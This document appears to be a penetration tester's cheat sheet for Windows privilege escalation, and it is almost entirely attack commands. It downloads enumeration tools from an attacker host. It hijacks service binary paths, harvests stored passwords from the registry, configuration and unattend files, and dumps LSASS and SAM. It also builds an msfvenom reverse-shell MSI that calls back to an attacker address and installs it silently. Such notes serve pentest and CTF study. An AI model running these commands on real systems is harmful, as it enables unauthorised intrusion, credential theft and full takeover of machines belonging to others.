# Windows Privilege Escalation

## Automated enumeration
```powershell
# WinPEAS
iwr http://$IP/winPEASx64.exe -o winpeas.exe
.\winpeas.exe

# PowerUp
iwr http://$IP/PowerUp.ps1 -o PowerUp.ps1
. .\PowerUp.ps1
Invoke-AllChecks
```

## Manual quick wins

### Privileges
```cmd
whoami /priv
whoami /groups
```

| Privilege | Exploit |
|---|---|
| SeImpersonatePrivilege | PrintSpoofer / JuicyPotato / GodPotato |
| SeAssignPrimaryToken | Potato attacks |
| SeBackupPrivilege | Copy SAM/SYSTEM, dump locally |
| SeRestorePrivilege | Overwrite system files |
| SeTakeOwnershipPrivilege | Take ownership of binaries/files |
| SeDebugPrivilege | Dump LSASS |
| SeLoadDriverPrivilege | Load malicious driver |

### Service exploitation
```powershell
# unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# weak service permissions (PowerUp)
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService

# replace binary path
sc.exe config <service> binPath= "C:\path\to\evil.exe"
sc.exe start <service>
```

### Stored credentials
```cmd
# Registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\Microsoft\Terminal Server Client"

# Files
findstr /si password *.txt *.ini *.config *.xml 2>nul
dir /s *pass* == *cred* == *vnc* == *.config* 2>nul

# Unattend files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\System32\sysprep\sysprep.xml
```

### AlwaysInstallElevated
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# if both = 1, generate MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### Token impersonation (SeImpersonate)
```powershell
# PrintSpoofer (preferred, modern Windows)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (newer alternative)
.\GodPotato.exe -cmd "cmd /c whoami"
```

### Scheduled tasks
```cmd
schtasks /query /fo LIST /v
# look for tasks running as SYSTEM with writable script paths
```

### Saved RDP / browser creds
```cmd
cmdkey /list
# if "Generic Credential" listed, runas /savecred
runas /savecred /user:DOMAIN\admin cmd.exe
```

## Checklist

- [ ] whoami /priv → potato if SeImpersonate
- [ ] whoami /groups → admin? backup ops?
- [ ] systeminfo → kernel exploit search
- [ ] services → unquoted paths, weak perms, modifiable binaries
- [ ] AlwaysInstallElevated
- [ ] Stored creds (registry, files, unattend)
- [ ] Scheduled tasks
- [ ] Writable %PATH% directories
- [ ] DLL hijacking opportunities
- [ ] cmdkey /list
